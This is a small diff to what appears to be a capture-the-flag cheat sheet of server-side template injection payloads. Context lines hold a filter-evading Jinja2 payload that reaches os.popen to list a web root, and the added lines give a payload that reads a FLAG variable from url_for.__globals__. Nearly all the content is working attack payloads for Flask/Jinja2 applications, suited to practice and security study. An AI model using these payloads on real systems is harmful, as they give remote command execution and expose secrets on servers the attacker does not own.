@@ -26,6 +26,10 @@ if `{{7*7}}` works, do these
     ```jinja2
     {{ lipsum.__globals__['o'+'s'].popen('c'+'d /var/www/html && l'+'s').read() }}
     ```
+* **look for a variable e.g `flag` :**
+    ```jinja2
+    {{ url_for.__globals__['FLAG'] }}
+    ```
 
 2. Twig (PHP)
 * **`ls`:**
